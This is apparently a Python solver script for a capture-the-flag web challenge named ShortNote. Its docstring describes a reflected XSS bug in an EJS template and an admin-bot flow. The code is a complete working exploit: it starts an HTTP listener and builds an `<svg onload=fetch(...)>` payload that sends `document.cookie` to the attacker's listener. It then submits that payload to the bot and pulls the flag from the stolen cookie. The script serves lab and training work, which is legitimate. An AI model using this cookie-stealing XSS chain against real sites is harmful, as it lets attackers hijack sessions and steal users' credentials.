"""
Solver for ShortNote.

Vulnerability: the home page (`source/src/views/index.ejs`, served by the
`app` service) reflects the `note` query parameter straight into the page
with EJS's unescaped output tag:

    <p><%- note %></p>

Whatever HTML we put in `?note=` is rendered verbatim as part of the page, so
a crafted `<svg onload=...>` element executes arbitrary JavaScript as soon as
the page loads (exactly the technique already documented and manually
verified in `solution/solution.txt`).

The app also exposes a "Check Note" flow: `GET /checkNote` renders a form
that POSTs a `noteUrl` to `POST /checkNote`, which calls `bot.openURL(url)`
(`source/src/bot.js`). That function launches Puppeteer *inside the very
same `app` container*, sets a cookie containing the flag scoped to the
configured `DOMAIN` (defaulting to `http://localhost:7777`, which is why the
bot only accepts same-origin URLs: see `isSameOrigin()` in `bot.js`), and
navigates to the given URL. So the "admin visit" happens against the app's
own `http://localhost:7777/...`, not an externally reachable hostname.

To automate the documented payload:

    1. Figure out our own IP as seen by the cluster network (same technique
       as the already-working `cross` solver: open a UDP socket toward the
       target and read back the local address picked for that route).
    2. Start a tiny HTTP listener that will receive the exfiltrated
       `document.cookie` value.
    3. POST `noteUrl=http://localhost:7777/?note=<payload>` to `/checkNote`
       on the externally reachable `app` endpoint. The payload is an
       `<svg onload=...>` element (matching `solution.txt`) that `fetch()`es
       our listener with the cookie, adapted to call our own listener instead
       of the original `webhook.site` URL.
    4. Wait for the in-container Puppeteer bot to hit our listener with the
       stolen cookie and pull the flag out of it.
"""

import os
import socket
import sys
import threading
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import requests

LISTENER_PORT = 8080
# The bot only ever visits same-origin URLs, which defaults to this fallback
# origin (see `isSameOrigin()` / the `DOMAIN` fallback in `source/src/bot.js`
# and `source/src/.env`), since the challenge.yaml doesn't override `DOMAIN`.
APP_SAME_ORIGIN = "http://localhost:7777"


def own_reachable_ip(target_host: str, target_port: int) -> str:
    """The IP by which `target_host` (and, symmetrically, our own listener) is reachable."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((target_host, target_port))
        return s.getsockname()[0]
    finally:
        s.close()


class Listener:
    """Receives the exfiltrated `document.cookie` value from the in-container bot's browser."""

    def __init__(self):
        self.cookie = None
        self.received = threading.Event()
        owner = self

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, fmt, *args):
                print(f"[listener] {self.address_string()} - {fmt % args}", file=sys.stderr)

            def do_GET(self):
                parsed = urllib.parse.urlparse(self.path)
                if parsed.path == "/exfil":
                    qs = urllib.parse.parse_qs(parsed.query)
                    cookie = qs.get("c", [""])[0]
                    print(f"[listener] exfil received: {cookie!r}")
                    owner.cookie = cookie
                    owner.received.set()
                    self.send_response(204)
                    self.end_headers()
                else:
                    self.send_response(404)
                    self.end_headers()

        self.server = ThreadingHTTPServer(("0.0.0.0", LISTENER_PORT), Handler)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)

    def start(self):
        self.thread.start()

    def wait_for_exfil(self, timeout: float) -> str:
        if not self.received.wait(timeout):
            raise TimeoutError("did not receive the exfiltrated cookie in time")
        return self.cookie

    def stop(self):
        self.server.shutdown()


def build_payload(listener_url: str) -> str:
    # Same technique as solution.txt's manually-tested payload
    # (`"><svg/onload=fetch(...)>`), just pointed at our own listener instead
    # of the original webhook.site URL.
    return (
        f'"><svg onload="fetch(\'{listener_url}/exfil?c=\''
        '+encodeURIComponent(document.cookie))">'
    )


def exploit(app_endpoint: str):
    app_host, app_port = app_endpoint.replace("http://", "").replace("https://", "").split(":")
    my_ip = own_reachable_ip(app_host, int(app_port))
    print(f"[*] Our listener is reachable at {my_ip}:{LISTENER_PORT}")

    listener = Listener()
    listener.start()

    listener_url = f"http://{my_ip}:{LISTENER_PORT}"
    payload = build_payload(listener_url)
    query = urllib.parse.quote(payload, safe="")
    # The in-container bot only visits same-origin URLs, so we point it back
    # at the app's own localhost origin rather than the externally reachable
    # endpoint we're posting to.
    note_url = f"{APP_SAME_ORIGIN}/?note={query}"
    print(f"[*] Crafted note URL: {note_url}")

    r = requests.post(f"{app_endpoint}/checkNote", data={"noteUrl": note_url}, timeout=15)
    assert r.ok, f"reporting the URL failed: {r.status_code} {r.text}"
    print(f"[*] Reported URL to the admin bot: {r.text.strip()[:200]!r}")

    cookie = listener.wait_for_exfil(timeout=60)
    listener.stop()

    assert "flag=" in cookie, f"exfiltrated cookie did not contain the flag cookie: {cookie!r}"
    flag = cookie.split("flag=", 1)[1]
    print(f"[*] Flag: {flag}")


if __name__ == "__main__":
    endpoint = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("SERVICE_APP_MAIN_ENDPOINT")
    assert endpoint, "usage: solve.py <app base url>"
    exploit(endpoint)
